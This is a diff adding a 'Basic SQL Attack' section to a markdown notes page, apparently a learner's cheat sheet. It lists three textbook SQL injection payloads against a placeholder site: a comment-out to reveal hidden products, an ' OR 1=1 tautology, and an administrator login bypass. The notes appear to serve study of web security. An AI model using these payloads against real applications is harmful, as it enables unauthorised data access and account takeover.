@@ -5,6 +5,17 @@ layout: single
 author-profile: true
 ---
 
+## Basic SQL Attack
+
+This pulls hidden information from that category
+``https://insecure-website.com/products?category=Gifts'--``
+
+This pulls information from categories the attacker does not know about 
+``https://insecure-website.com/products?category=Gifts'+OR+1=1--``
+
+This will log an attacker in by removing the password from the query
+``SELECT * FROM users WHERE username = 'administrator'--' AND password = ''``
+
 ## Commands
 ### String concatenation
 You can concatenate together multiple strings to make a single string.
